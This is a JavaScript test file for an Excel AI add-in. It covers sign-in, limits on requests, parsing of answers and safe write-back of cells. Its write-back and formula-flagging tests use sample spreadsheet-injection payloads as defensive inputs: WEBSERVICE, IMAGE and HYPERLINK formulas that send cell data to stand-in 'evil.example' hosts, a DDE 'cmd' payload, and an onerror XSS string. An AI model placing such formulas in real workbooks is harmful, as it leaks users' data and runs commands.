// Ask Eden for Excel's own files (public/addins/excel/): the pure helpers in lib.js (PKCE, request
// bodies within the server's limits, reading answers, what may be written back, the cell function's
// cache), the =EDEN.ASK cell function (functions.js) against a fake server, and the files themselves:
// the manifest well-formed with the right addresses, every referenced file there, no inline scripts.
import assert from 'node:assert/strict';
import { readFileSync, readdirSync, existsSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { test } from 'node:test';
import vm from 'node:vm';
import { challengeOf as serverChallenge } from '../src/accounts/scoped.js';
import { parseSheet, SHEET, cleanTokens as serverCleanTokens } from '../src/eden/sheets.js';
import * as serverSheets from '../src/eden/sheets.js';
import * as serverAsk from '../src/eden/ask.js';

const DIR = join(dirname(fileURLToPath(import.meta.url)), '..', 'public', 'addins', 'excel');
const read = (name) => readFileSync(join(DIR, name), 'utf8');

// A storage like localStorage.
class Store {
  constructor() {
    this.map = new Map();
  }
  getItem(k) {
    return this.map.has(k) ? this.map.get(k) : null;
  }
  setItem(k, v) {
    this.map.set(k, String(v));
  }
  removeItem(k) {
    this.map.delete(k);
  }
}
const storage = new Store();
Object.defineProperty(globalThis, 'localStorage', { value: storage, configurable: true, writable: true });
vm.runInThisContext(read('lib.js'), { filename: 'lib.js' });
const X = globalThis.EdenExcel;

test('PKCE: a verifier the server takes, and the same S256 challenge the server computes', async () => {
  const verifier = X.randomCode(48);
  assert.match(verifier, /^[A-Za-z0-9._~-]{43,128}$/);
  assert.equal(X.randomCode().length, 43);
  assert.notEqual(X.randomCode(), X.randomCode());
  const challenge = await X.challengeOf(verifier);
  assert.match(challenge, /^[A-Za-z0-9_-]{43}$/);
  assert.equal(challenge, await serverChallenge(verifier));
});

test('connect: the consent address, the return check, the token body', () => {
  const url = new URL(X.connectUrl({ origin: 'https://askeden.com', state: 'state-12345', challenge: 'c'.repeat(43) }));
  assert.equal(url.origin + url.pathname, 'https://askeden.com/eden/connect');
  assert.equal(url.searchParams.get('client_id'), 'excel');
  assert.equal(url.searchParams.get('redirect_uri'), 'https://askeden.com/addins/excel/connected');
  assert.equal(url.searchParams.get('code_challenge_method'), 'S256');
  // A preview Worker's pane comes back to itself.
  assert.equal(X.redirectFor('https://eden-preview.example.workers.dev'), 'https://eden-preview.example.workers.dev/addins/excel/connected');
  assert.equal(X.redirectFor('javascript:alert(1)'), 'https://askeden.com/addins/excel/connected');

  const back = 'https://askeden.com/addins/excel/connected';
  assert.deepEqual(X.readRedirect(`${back}?code=acc.secret&state=s1234567`, 's1234567'), { code: 'acc.secret' });
  assert.deepEqual(X.readRedirect(`${back}?code=acc.secret&state=other123`, 's1234567'), { error: 'bad_state' });
  assert.deepEqual(X.readRedirect(`${back}?error=access_denied&state=s1234567`, 's1234567'), { error: 'access_denied' });
  assert.deepEqual(X.readRedirect(`${back}?state=s1234567`, 's1234567'), { error: 'no_code' });
  assert.deepEqual(X.readRedirect('https://askeden.com/elsewhere?code=a.b&state=s1234567', 's1234567'), { error: 'bad_redirect' });
  assert.deepEqual(X.readRedirect('not a url', 's1234567'), { error: 'bad_redirect' });
  assert.deepEqual(X.readRedirect(`${back}?code=a.b&state=`, ''), { error: 'bad_state' });

  assert.deepEqual(X.tokenBody({ code: 'a.b', verifier: 'v', origin: 'https://askeden.com' }), { grant_type: 'authorization_code', code: 'a.b', code_verifier: 'v', client_id: 'excel', redirect_uri: back });

  // The dialog opens on the add-in's own page (Office.js loads first), which goes on to the consent page.
  const state = X.randomCode(18);
  const challenge = 'c'.repeat(43);
  const start = new URL(X.dialogUrl({ origin: 'https://askeden.com', state, challenge }));
  assert.equal(start.origin + start.pathname, 'https://askeden.com/addins/excel/connect.html');
  assert.ok(existsSync(join(DIR, 'connect.html')) && existsSync(join(DIR, 'connect.js')));
  // Office adds its own _host_Info to the address; only state and the challenge are used.
  const next = X.startTarget(`${start.search}&_host_Info=Excel$Win32$16.01$en-US`, 'https://askeden.com');
  assert.equal(next, X.connectUrl({ origin: 'https://askeden.com', state, challenge }));
  assert.equal(X.startTarget('?state=short&code_challenge=x', 'https://askeden.com'), null);
  assert.equal(X.startTarget(`?state=${state}&code_challenge=${challenge}"><x`, 'https://askeden.com'), null);
  // The relay's state rule on the server: 24 to 1,024 of these characters (ask.js RELAY_STATE).
  assert.match(state, /^[A-Za-z0-9._~+/=-]{24,1024}$/);
});

test('connect on Excel on the web: the landing page relays the code, the pane polls for it (R1X1)', () => {
  const landing = read('connected.js');
  assert.match(landing, /fetch\('\/api\/eden\/relay', \{ method: 'POST', headers: \{ 'content-type': 'application\/json' \}, body: JSON\.stringify\(\{ state, code \}\) \}\)/);
  assert.match(landing, /try \{\s*ui\.messageParent/, 'messageParent can throw: caught (R1X29)');
  const pane = read('taskpane.js');
  assert.match(pane, /fetchJson\(connectTiming\.lookMs, '\/api\/eden\/relay\/take', \{ method: 'POST', headers: \{ 'content-type': 'application\/json' \}, body: JSON\.stringify\(\{ state \}\) \}\)/);
  assert.match(pane, /const now = await take\(mine\.state\);\s*if \(now\.code\) return job\.got\(now\.code\);/);
  assert.match(pane, /pollMs: 1500/, 'about every 1.5 s while the dialog is open');
  assert.match(pane, /12007 \? t\('finishSignIn'\)/, 'a second Connect while one is open (R1X44)');
  assert.match(pane, /12002 \|\| arg\.error === 12003 \? t\('cantLoadSignIn'\)/, 'a page that didn’t load isn’t "closed" (R1X29)');
});

test('connect: a window closed or cut off (12006) doesn’t end it; the pane waits for the relay, with Cancel (R2X1, R2X14)', () => {
  const pane = read('taskpane.js');
  const start = pane.slice(pane.indexOf('function startConnect('), pane.indexOf('async function redeem('));
  // 12006: the attempt goes on; the relay is polled, more slowly, for 5 minutes, and the pane says so.
  assert.match(start, /if \(arg\.error === 12006 && web\) \{[\s\S]*?job\.waiting = true;[\s\S]*?job\.until = Date\.now\(\) \+ connectTiming\.waitMs;[\s\S]*?connectNote\(t\('connectWaiting'\)\)[\s\S]*?return;/);
  assert.match(pane, /waitMs: 5 \* 60_000/);
  assert.match(start, /job\.delay = Math\.min\(connectTiming\.maxPollMs, Math\.round\(job\.delay \* 1\.3\)\)/, 'backing off while waiting');
  assert.doesNotMatch(start, /12006 \? t\('cancelled'\)/, '12006 is no longer "cancelled"');
  // Connect again while waiting: the same attempt (same state and verifier), a new window; while a window is open: finish it.
  assert.match(start, /if \(connecting\) \{\s*if \(connecting\.dialog\) return connectNote\(t\('finishSignIn'\), 'warn'\);\s*return openDialog\(connecting, ui\);/);
  // A code that comes after the attempt ran out of time still connects on the next Connect.
  assert.match(start, /job\.end\(t\('connectExpired'\), 'warn', \{ keep: true \}\)/);
  assert.match(start, /const old = await take\(job\.earlier\.state\);\s*if \(old\.code\) return job\.got\(old\.code, job\.earlier\.verifier\);/);
  // Cancel is there while connecting (a Cancel on the consent page can't reach the pane on the web).
  assert.match(pane, /button\('link', t\('cancel'\), \(\) => job\.end\(t\('cancelled'\), ''\)\)/);
  for (const lang of ['en', 'fr']) for (const key of ['connectWaiting', 'cancel', 'landingRelayed']) assert.ok(X.STRINGS[lang][key], `${lang}.${key}`);
  assert.equal(X.STRINGS.en.connectWaiting, 'Finish signing in in the window that opened; this pane will connect by itself.');
  // The landing page says Connected only when Office handed the code over; relayed only, "go back to Excel".
  const landing = read('connected.js');
  assert.match(landing, /else if \(sent\) say\(t\('landingConnected'\), t\('landingBack'\)\);\s*else say\(t\('landingAlmost'\), relayed \? t\('landingRelayed'\) : t\('landingOpen'\)\);/);
});

test('the token: saved with its expiry, read back, forgotten', () => {
  const s = new Store();
  assert.equal(X.saveToken(s, { access_token: 'nope' }), false);
  assert.equal(X.saveToken(s, { access_token: 'es1.a.b.c', expires_in: 60 }, 1000), true);
  assert.equal(X.readToken(s, 2000), 'es1.a.b.c');
  assert.equal(X.readToken(s, 1000 + 61_000), null);
  X.forgetToken(s);
  assert.equal(X.readToken(s), null);
  s.setItem(X.TOKEN_KEY, '{broken');
  assert.equal(X.readToken(s), null);
  // A late 401 for an old token forgets only that token (R1X31).
  X.saveToken(s, { access_token: 'es1.new.b.c', expires_in: 60 });
  X.forgetToken(s, 'es1.old.b.c');
  assert.equal(X.readToken(s), 'es1.new.b.c');
  X.forgetToken(s, 'es1.new.b.c');
  assert.equal(X.readToken(s), null);
});

test('cells as sent: dates as shown, empties as null, long text capped', () => {
  assert.equal(X.cellOf(45291, '12/31/2023'), '12/31/2023');
  assert.equal(X.cellOf(0.5, '12:00 PM'), '12:00 PM');
  assert.equal(X.cellOf(1234.5, '$1,234.50'), 1234.5);
  assert.equal(X.cellOf(0.25, '25%'), 0.25);
  assert.equal(X.cellOf(12, '########'), 12);
  assert.equal(X.cellOf('', ''), null);
  assert.equal(X.cellOf(true), true);
  assert.equal(X.cellOf('x'.repeat(3000)).length, 2000);
  assert.deepEqual(X.gridOf([[1, 'a'], ['', 45291]], [['1', 'a'], ['', '1/1/2024']]), [[1, 'a'], [null, '1/1/2024']]);
  assert.deepEqual(X.formulaGrid([['=A1+1', 3], ['x', '=SUM(A:A)']]), [['=A1+1', ''], ['', '=SUM(A:A)']]);
  assert.equal(X.formulaGrid([[1, 'x']]), null);
  assert.deepEqual(X.kindsOf([[1, 'a', true, '', null]]), [['number', 'text', 'boolean', 'empty', 'empty']]);
  // Fill and Clean never cut a cell: the first one too long is named instead (R1X3).
  assert.deepEqual(X.longCell([['a', 'x'.repeat(2001)]]), [0, 1]);
  assert.equal(X.longCell([['x'.repeat(2000)]]), null);
  assert.deepEqual(X.longCell([['x'.repeat(1995) + '\n\n\n']], true), [0, 0], 'escaped line breaks count');
});

test('limits: too many cells or rows is refused before anything is read or sent', () => {
  assert.equal(X.sizeProblem('analyze', 100, 50), null);
  assert.match(X.sizeProblem('analyze', 1048576, 1), /1,048,576 cells.*at most 5,000/);
  assert.match(X.sizeProblem('fill', 1001, 1), /at most 1,000 rows/);
  assert.equal(X.sizeProblem('ask', 1001, 1), null);
  const fit = X.fitRows(Array.from({ length: 3000 }, () => ['a', 'b']));
  assert.equal(fit.rows, 2500);
  assert.equal(fit.trimmed, true);
  assert.match(X.sizeProblem('fill', 1001, 1, X.wordsFor('fr')), /au plus 1\s000 lignes/);
});

test('Fill and Clean in parts, each one answer the server allows, at most 2 at a time (R1X35)', () => {
  assert.equal(X.LIMITS.fillRows, SHEET.apps.excel.fillRows);
  assert.equal(X.LIMITS.cleanTokens, SHEET.apps.excel.cleanTokens);
  assert.equal(X.LIMITS.inFlight, 2);
  const rows = Array.from({ length: 30 }, (_, i) => [`naïve café ${i} ✓`, i, null]);
  assert.equal(X.cleanTokens(rows), serverCleanTokens(rows.map((r) => r.map((c) => (c === null ? '' : String(c))))));
  // Fill: 1,000 rows → 5 parts of 200.
  const fill = Array.from({ length: 1000 }, (_, i) => [`city ${i}`]);
  const fp = X.chunksFor('fill', fill, null);
  assert.deepEqual(fp.map((p) => p.end - p.start), [200, 200, 200, 200, 200]);
  // Clean: a big selection splits so each part fits the server's clean budget, and the server takes each.
  const big = Array.from({ length: 900 }, (_, i) => [`Name number ${i} with some text`, `Another column value ${i}`, i, 'paris ']);
  const cp = X.chunksFor('clean', big, null);
  assert.ok(cp.length > 1 && cp.length <= X.LIMITS.parts, `parts: ${cp.length}`);
  assert.equal(cp[0].start, 0);
  assert.equal(cp.at(-1).end, big.length);
  for (const p of cp) {
    const part = X.cleanSend(big.slice(p.start, p.end));
    const { body, error } = X.sheetBody({ action: 'clean', sheet: { name: 'S', range: X.rangeName({ col: 0, row: 1 }, p.start, p.end - p.start, 4), values: part.values } });
    assert.equal(error, undefined);
    assert.doesNotThrow(() => parseSheet(body), `part ${p.start}-${p.end} is one answer the server allows`);
  }
  for (const p of fp) {
    const { body } = X.sheetBody({ action: 'fill', instruction: 'country', sheet: { range: X.rangeName({ col: 0, row: 1 }, p.start, p.end - p.start, 1), values: fill.slice(p.start, p.end) } });
    assert.doesNotThrow(() => parseSheet(body));
  }
  // Too much for 8 parts, or one row too big for an answer: refused in plain words.
  assert.match(X.chunksFor('clean', Array.from({ length: 1000 }, () => ['x'.repeat(1900), 'y'.repeat(1900)]), null).error, /too much to clean at once/);
  assert.match(X.chunksFor('clean', [Array.from({ length: 12 }, () => 'z'.repeat(1990))], null).error, /Row 1 of the selection is too long/);
});

test('request bodies: within the server’s limits, and the server takes them', () => {
  const values = [['City', 'Sales'], ['paris ', 3], ['Lyon', null]];
  const cases = [
    { action: 'ask', instruction: 'Which city sold most?', sheet: { name: 'Sales', range: 'A1:B3', values } },
    { action: 'analyze', sheet: { name: 'Sales', range: 'A1:B3', values } },
    { action: 'formula', instruction: 'total sales', sheet: { name: 'Sales', range: 'A1:B3', values }, active: { address: 'B4' } },
    { action: 'explain', active: { address: 'B4', formula: '=SUM(B2:B3)', value: '3' } },
    { action: 'fill', instruction: 'country', sheet: { range: 'A1:A3', values: [['Paris'], ['Lyon'], ['Rome']] } },
    { action: 'clean', sheet: { range: 'A1:B3', values, formulas: [['', ''], ['', '=1+2'], ['', '']] } },
    { action: 'table', instruction: 'a 3-day plan', active: { address: 'D2' } },
    { action: 'cell', instruction: 'Sum it', sheet: { values: [[1], [2]] } },
  ];
  for (const c of cases) {
    const { body, error } = X.sheetBody(c);
    assert.equal(error, undefined, c.action);
    assert.equal(body.app, 'excel');
    assert.equal(parseSheet(body).action, c.action, `server takes ${c.action}`);
  }
  assert.match(X.sheetBody({ action: 'formula' }).error, /Type what you want/);
  assert.match(X.sheetBody({ action: 'fill', sheet: { values: [['a']] } }).error, /each row/);
  assert.match(X.sheetBody({ action: 'analyze', sheet: { values: [[null, '']] } }).error, /Select some cells/);
  assert.match(X.sheetBody({ action: 'explain', active: { address: 'A1', value: '3' } }).error, /formula first/);
  assert.match(X.sheetBody({ action: 'ask', instruction: 'x', sheet: { values: [Array(5001).fill(1)] } }).error, /5,000 cells/);
  assert.match(X.sheetBody({ action: 'ask', instruction: 'x', sheet: { values: Array.from({ length: 40 }, () => ['y'.repeat(1999)]) } }).error, /too much text/);
  assert.match(X.sheetBody({ action: 'clean', sheet: { values: Array.from({ length: 1001 }, () => ['x']) } }).error, /1,000 rows/);
  // The instruction is cut to the server's limit; history keeps the last 20 turns, starting with the person's.
  const long = X.sheetBody({ action: 'ask', instruction: 'q'.repeat(2500), history: Array.from({ length: 25 }, (_, i) => ({ role: i % 2 ? 'eden' : 'user', text: `t${i}` })) }).body;
  assert.equal(long.instruction.length, SHEET.instructionChars);
  assert.ok(long.history.length <= SHEET.history);
  assert.equal(long.history[0].role, 'user');
  assert.equal(parseSheet(long).history.length, long.history.length);
  // History never pushes a request over the server's characters: the oldest turns go first.
  const values2 = Array.from({ length: 50 }, () => ['v'.repeat(1000)]);
  const busy = X.sheetBody({ action: 'analyze', sheet: { values: values2 }, history: Array.from({ length: 6 }, (_, i) => ({ role: i % 2 ? 'eden' : 'user', text: 'h'.repeat(5000) })) }).body;
  assert.ok(busy.history.length >= 1 && busy.history.length < 6);
  assert.equal(busy.history[0].role, 'user');
  assert.doesNotThrow(() => parseSheet(busy));
});

test('reading answers: one formula, one line per row, a same-shape clean, a table', () => {
  assert.equal(X.formulaOf('=SUM(B2:B9)'), '=SUM(B2:B9)');
  assert.equal(X.formulaOf('```excel\n=XLOOKUP(A2,D:D,E:E)\n```'), '=XLOOKUP(A2,D:D,E:E)');
  assert.equal(X.formulaOf('Here you go:\n`=A1*2`'), '=A1*2');
  assert.equal(X.formulaOf('I can’t do that'), null);
  // A closing quote that belongs to the formula stays (R1X7); quotes around the whole formula go.
  assert.equal(X.formulaOf('=B2&" kg"'), '=B2&" kg"');
  assert.equal(X.formulaOf('"=A1*2"'), '=A1*2');
  assert.equal(X.formulaOf('“=IF(A1>0,"yes","no")”'), '=IF(A1>0,"yes","no")');

  assert.deepEqual(X.fillCheck('France\nFrance\nItaly\n', 3), { lines: ['France', 'France', 'Italy'] });
  assert.deepEqual(X.fillCheck('France\n\nItaly', 3), { lines: ['France', '', 'Italy'] });
  assert.deepEqual(X.fillCheck('a\nb\n\n\n', 2), { lines: ['a', 'b'] });
  // Rows whose value really is blank at the end are kept (R1X34).
  assert.deepEqual(X.fillCheck('France\nFrance\nItaly\n\n', 5), { lines: ['France', 'France', 'Italy', '', ''] });
  assert.deepEqual(X.fillCheck('France\nItaly\n', 3), { lines: ['France', 'Italy', ''] });
  // A preamble that pushes the answers down a row is refused (R1X39).
  assert.match(X.fillCheck('Here are the countries:\nFrance\nFrance\nItaly', 4).error, /added a line before/);
  assert.match(X.fillCheck('x', 2, X.wordsFor('fr')).error, /Eden a écrit 1 lignes pour 2/);
  assert.match(X.fillCheck('France\nItaly', 3).error, /2 lines for 3 rows, so nothing was written/);
  assert.match(X.fillCheck('a\nb\nc\nd', 3).error, /4 lines for 3 rows/);

  assert.deepEqual(X.parseTsv('a\tb\r\nc\td\n'), [['a', 'b'], ['c', 'd']]);
  assert.deepEqual(X.parseTsv('| Day | Plan |\n|---|---|\n| Mon | Run |'), [['Day', 'Plan'], ['Mon', 'Run']]);

  const sent = [['City', 'Sales'], ['paris ', 3], ['LYON', null]];
  const ok = X.cleanCheck('City\tSales\nParis\t3\nLyon', sent); // a trailing empty cell may be dropped
  assert.deepEqual(ok.rows, [['City', 'Sales'], ['Paris', '3'], ['Lyon', '']]);
  assert.match(X.cleanCheck('City\tSales\nParis\t3', sent).error, /2 rows for 3/);
  assert.match(X.cleanCheck('City\tSales\nParis\t3\textra\nLyon\t', sent).error, /Row 2 came back with 3 cells/);
  assert.match(X.cleanCheck('City\tSales\nParis\nLyon\t', sent).error, /Row 2 came back with 1 cells instead of 2/);
  // Formula cells are never changed; unchanged cells aren't listed.
  const changes = X.cleanChanges(sent, ok.rows, [['', ''], ['', '=1+2'], ['', '']]);
  assert.deepEqual(changes, [{ r: 1, c: 0, from: 'paris ', to: 'Paris' }, { r: 2, c: 0, from: 'LYON', to: 'Lyon' }]);
  assert.deepEqual(X.cleanChanges([['Madrid ', 3]], [['Madrid', '3']]), [{ r: 0, c: 0, from: 'Madrid ', to: 'Madrid' }]);
  // Booleans echoed as Excel shows them, and numbers re-spelled, aren't changes (R1X19).
  assert.deepEqual(X.cleanChanges([[true, false, 3]], [['TRUE', 'faux', '3.0']], null, { kinds: [['boolean', 'boolean', 'number']] }), []);
  assert.deepEqual(X.cleanChanges([[true]], [['no']], null, { kinds: [['boolean']] }), [{ r: 0, c: 0, from: 'true', to: 'no' }]);
  // Blank first and last rows may be left out of the answer when they were blank (R1X33).
  const edges = [[null, null], ['paris ', 1], ['LYON', 2], [null, '']];
  assert.deepEqual(X.cleanCheck('Paris\t1\nLyon\t2', edges).rows, [['', ''], ['Paris', '1'], ['Lyon', '2'], ['', '']]);
  assert.deepEqual(X.cleanCheck('\t\nParis\t1\nLyon\t2\n\t\n', edges).rows, [['', ''], ['Paris', '1'], ['Lyon', '2'], ['', '']]);
  assert.match(X.cleanCheck('Paris\t1', edges).error, /3 rows for 4/);
  // Line breaks and tabs inside a cell survive a clean: they go and come back escaped (R1X3).
  const cells = [['Notes'], ['line one\nline two'], ['a\tb'], ['C:\\new'], ['x\u2028y']];
  const out = X.cleanSend(cells);
  assert.deepEqual(out.values, [['Notes'], ['line one\\nline two'], ['a\\tb'], ['C:\\new'], ['x\\u2028y']]);
  assert.deepEqual(out.escaped.map((r) => r[0]), [false, '\n', '\n', false, '\n']);
  assert.ok(out.values.every((r) => !/[\t\n\r\u0085\u2028\u2029]/.test(r[0])), 'nothing the server would flatten');
  const echo = out.values.map((r) => r.join('\t')).join('\n');
  const back = X.cleanReceive(X.cleanCheck(echo, out.values).rows, out.escaped);
  assert.deepEqual(back, cells, 'a faithful echo changes nothing');
  assert.deepEqual(X.cleanChanges(cells, back), []);
  const fixed = X.cleanReceive(X.cleanCheck('Notes\nLine one\\nline two\na\\tb\nC:\\new\nx\\u2028y', out.values).rows, out.escaped);
  assert.deepEqual(X.cleanChanges(cells, fixed), [{ r: 1, c: 0, from: 'line one\nline two', to: 'Line one\nline two' }]);

  // Short rows are padded to the header's width (a row wider than its header is refused: below).
  assert.deepEqual(X.tableCheck('Day\tPlan\tNote\nMon\tRun\n\n').rows, [['Day', 'Plan', 'Note'], ['Mon', 'Run', '']]);
  assert.match(X.tableCheck('').error, /didn’t send back a table/);
  assert.match(X.tableCheck(Array.from({ length: 3000 }, () => 'a\tb').join('\n')).error, /too big/);
  // Wrong shapes (R1X39): a preamble line, prose, rows wider than the header.
  assert.match(X.tableCheck('Sure! Here is your table:\nDay\tTask\nMon\tRun').error, /line before the table/);
  assert.match(X.tableCheck('I cannot make that table because the request is unclear and I need more detail.\nPlease say more.').error, /didn’t send back a table/);
  assert.match(X.tableCheck('Day\tPlan\nMon\tRun\tfast\tnow').error, /don’t line up/);
  assert.deepEqual(X.tableCheck('Item\nPen\nPaper').rows, [['Item'], ['Pen'], ['Paper']], 'a one-column table is fine');
});

test('writing back: model text never becomes a formula, and text Excel would change goes in as text (R1X2)', () => {
  const w = (s, kind) => X.cellWrite(s, kind);
  // Formula-like text: an apostrophe and the Text format.
  assert.deepEqual(w('=WEBSERVICE("https://evil.example/?"&A1)'), { v: '\'=WEBSERVICE("https://evil.example/?"&A1)', asText: true });
  assert.deepEqual(w('+1 555 0100'), { v: "'+1 555 0100", asText: true });
  assert.deepEqual(w('@SUM(A1)'), { v: "'@SUM(A1)", asText: true });
  assert.deepEqual(w('-'), { v: "'-", asText: true });
  // Plain numbers stay numbers.
  assert.deepEqual(w('-12.5'), { v: -12.5, asText: false });
  assert.deepEqual(w('42'), { v: 42, asText: false });
  assert.deepEqual(w('0.5'), { v: 0.5, asText: false });
  // What Excel would read as something else stays the text Eden wrote (the cell gets "@" first).
  for (const s of ['007', '02134', '12345678901234567', '1-2', '3/4', '1/2', 'MARCH1', '1e400', '1E5', '12:30', '$1,200', '#N/A', 'TRUE', 'faux', '1 1/2', '5 Mar', 'Jan-24', '10 AM', '1 234', '31.12.2023', '12,5%']) assert.deepEqual(w(s), { v: s, asText: true }, s);
  assert.deepEqual(w('France'), { v: 'France', asText: false });
  // Only text Excel would re-read gets "@": ordinary text with a digit stays General, so a formula typed there later works (R2X11).
  for (const s of ['Building 5', 'Q1 2024', 'Paris 75', 'Route 66 West', 'Decision', 'May']) assert.deepEqual(w(s), { v: s, asText: false }, s);
  // Numbers as Eden wrote them (R2X18): trailing zeros and English thousands keep their look; a percentage is a number.
  assert.deepEqual(w('1.50'), { v: 1.5, asText: false, format: '0.00' });
  assert.deepEqual(w('3.0'), { v: 3, asText: false, format: '0.0' });
  assert.deepEqual(w('1.25'), { v: 1.25, asText: false });
  assert.deepEqual(w('1,234'), { v: 1234, asText: false, format: '#,##0' });
  assert.deepEqual(w('-1,234,567.5'), { v: -1234567.5, asText: false, format: '#,##0.0' });
  assert.deepEqual(X.cellWrite('1,234', 'auto', { lang: 'fr' }), { v: '1,234', asText: true }, 'in French 1,234 is a decimal: kept as written');
  assert.deepEqual(w('50%'), { v: 0.5, asText: false, format: '0%' });
  assert.deepEqual(w('12.5%'), { v: 0.125, asText: false, format: '0.0%' });
  assert.deepEqual(w('1,234', 'text'), { v: '1,234', asText: true }, 'Clean keeps a text cell text');
  assert.deepEqual(w('1.50', 'number'), { v: 1.5, asText: false }, 'a number cell keeps its own format');
  assert.deepEqual(w(''), { v: '', asText: false });
  assert.deepEqual(w("'quoted'"), { v: "''quoted'", asText: false }, 'Excel takes one leading apostrophe away');
  // Clean keeps each cell's kind: a text cell stays text, a number cell may be read, a boolean stays one.
  assert.deepEqual(w('00123', 'text'), { v: '00123', asText: true });
  assert.deepEqual(w('42', 'text'), { v: '42', asText: true });
  assert.deepEqual(w('1200', 'number'), { v: 1200, asText: false });
  assert.deepEqual(w('2024-01-05', 'number'), { v: '2024-01-05', asText: false }, 'a date cell stays a date');
  assert.deepEqual(w('=1+1', 'number'), { v: "'=1+1", asText: false });
  assert.deepEqual(w('TRUE', 'boolean'), { v: true, asText: false });
  assert.deepEqual(w('Faux', 'boolean'), { v: false, asText: false });
  assert.deepEqual(w('maybe', 'boolean'), { v: 'maybe', asText: false });
  assert.deepEqual(X.splitAddress("'Q1 ''24'!B2:D9"), { sheet: "Q1 '24", cells: 'B2:D9' });
  assert.deepEqual(X.splitAddress('Sheet1!A1'), { sheet: 'Sheet1', cells: 'A1' });
  assert.equal(X.cellsOf('B2'), 'B2');
  assert.deepEqual(X.topLeftOf('Sheet1!$C$7:D9'), { col: 2, row: 7 });
  assert.equal(X.cellName({ col: 25, row: 3 }, 2, 1), 'AA5');
  assert.equal(X.rangeName({ col: 0, row: 1 }, 200, 100, 3), 'A201:C300');
  assert.equal(X.rangeName({ col: 1, row: 4 }, 0, 1, 1), 'B4');
});

test('formulas that reach outside the workbook are flagged before Insert (R1X8)', () => {
  assert.deepEqual(X.reachesOut('=SUM(B2:B9)'), []);
  assert.deepEqual(X.reachesOut('=XLOOKUP(A2,Table1[Name],Table1[Price])'), [], 'structured references are fine');
  assert.deepEqual(X.reachesOut('=A1&"WEBSERVICE( | [x.xlsx]"'), [], 'words inside text are fine');
  assert.deepEqual(X.reachesOut('=WEBSERVICE("https://evil.example/?d="&ENCODEURL(TEXTJOIN(",",TRUE,A1:E7)))'), ['WEBSERVICE']);
  assert.deepEqual(X.reachesOut('=_xlfn.IMAGE("https://x.example/a.png?"&A1)'), ['IMAGE']);
  assert.deepEqual(X.reachesOut('=HYPERLINK("https://evil.example/"&A2,"Open")'), ['HYPERLINK']);
  assert.deepEqual(X.reachesOut("=cmd|' /C calc'!A0"), ['DDE']);
  assert.deepEqual(X.reachesOut("='https://evil.example/[x.xlsx]S'!A1"), ['external link']);
  assert.deepEqual(X.reachesOut('=[Budget.xlsx]Sheet1!A1+[1]Sheet1!B2'), ['external link']);
  assert.deepEqual(X.reachesOut('=RTD("x",,"y")+CALL("a","b","c")'), ['RTD', 'CALL']);
});

test('errors in plain words, with Connect or See your plan when they help', () => {
  assert.equal(X.errorWords(401, 'not_connected').connect, true);
  const plan = X.errorWords(402, 'no_allowance', 'No included AI is left this month.');
  assert.equal(plan.plan, true);
  assert.equal(plan.words, 'No included AI is left this month.');
  assert.match(X.errorWords(429, 'slow_down').words, /Wait a moment/);
  assert.match(X.errorWords(413, 'too_long', 'Select fewer cells (at most 5,000).').words, /5,000/);
  assert.match(X.errorWords(503, 'not_set_up').words, /isn’t ready/);
  assert.match(X.errorWords(0).words, /Can’t reach askeden\.com/);
  assert.match(X.errorWords(400, 'bad_request', 'Type what you want first.').words, /Type what you want/);
  const fr = X.wordsFor('fr-FR');
  assert.match(X.errorWords(402, 'no_allowance', 'No included AI is left this month.', fr).words, /Il ne reste plus d’IA incluse/);
  assert.match(X.errorWords(0, '', '', fr).words, /Impossible de joindre askeden\.com/);
  assert.match(X.errorWords(413, 'cut_off', 'cut').words, /cut off/);
  // Busy: Retry-After (seconds) with a little jitter, else a growing wait, never more than 30 s.
  assert.equal(X.retryWait('3', 0, () => 0), 3000);
  assert.equal(X.retryWait(null, 2, () => 0), 6000);
  assert.equal(X.retryWait('999', 0, () => 0), 30000);
});

test('the cell cache: keyed by prompt + values, kept, capped, cleared', () => {
  const s = new Store();
  const k1 = X.cacheKey('Sum it', [[1], [2]]);
  assert.equal(k1, X.cacheKey('  Sum it ', [[1], [2]]));
  assert.notEqual(k1, X.cacheKey('Sum it', [[1], [3]]));
  assert.notEqual(k1, X.cacheKey('Sum it', null));
  assert.match(k1, /^eden-fx:[0-9a-f]{16}$/);
  X.cachePut(s, k1, '3', 1000);
  assert.equal(X.cacheGet(s, k1, 2000), '3');
  assert.equal(X.cacheGet(s, k1, 1000 + 31 * 864e5), null);
  for (let i = 0; i < 510; i++) X.cachePut(s, X.cacheKey(`q${i}`, null), String(i));
  assert.equal(X.cacheCount(s), 500);
  assert.equal(X.cacheClear(s), 500);
  assert.equal(X.cacheCount(s), 0);
  assert.equal(X.cellAnswer('Paris\nFrance'), 'Paris France');
  // A blank answer is never kept; the index is written before old answers are dropped.
  X.cachePut(s, 'eden-fx:blank', '  ');
  assert.equal(s.getItem('eden-fx:blank'), null);
  assert.equal(X.cacheCount(s), 0);
  assert.deepEqual(X.trimGrid([[1, '', ''], ['', 2, ''], ['', '', ''], ['', '', '']]), [[1, ''], ['', 2]]);
  assert.deepEqual(X.trimGrid([['', ''], ['', '']]), []);
  assert.equal(X.cellResult('42'), 42);
  assert.equal(X.cellResult('-3.5'), -3.5);
  assert.equal(X.cellResult('007'), '007', 'leading zeros stay text');
  assert.equal(X.cellResult('1,200'), '1,200');
});

test('light Markdown as blocks, never HTML', () => {
  assert.deepEqual(X.blocks('**Top:** Paris\n\n- one\n- `two`'), [
    { type: 'p', runs: [{ t: 'Top:', b: true }, { t: ' Paris' }] },
    { type: 'gap' },
    { type: 'li', runs: [{ t: 'one' }] },
    { type: 'li', runs: [{ t: 'two', code: true }] },
  ]);
  assert.equal(X.blocks('<img src=x onerror=alert(1)>')[0].runs[0].t, '<img src=x onerror=alert(1)>');
  assert.equal(X.wordsFor('fr-FR')('connect'), 'Connecter');
  assert.equal(X.wordsFor('de-DE')('connect'), 'Connect');
  assert.equal(X.wordsFor('en')('cellsCount', { n: 3, cap: 100 }), 'Cell answers this session: 3 of 100.');
  for (const key of Object.keys(X.STRINGS.en)) assert.ok(X.STRINGS.fr[key], `French for ${key}`);
  for (const key of Object.keys(X.STRINGS.fr)) assert.ok(X.STRINGS.en[key], `English for ${key}`);
  // Italics without lookbehind (older Mac WebKit can't parse it, R1X17), same results as before.
  assert.doesNotMatch(read('lib.js'), /\(\?<[!=]/);
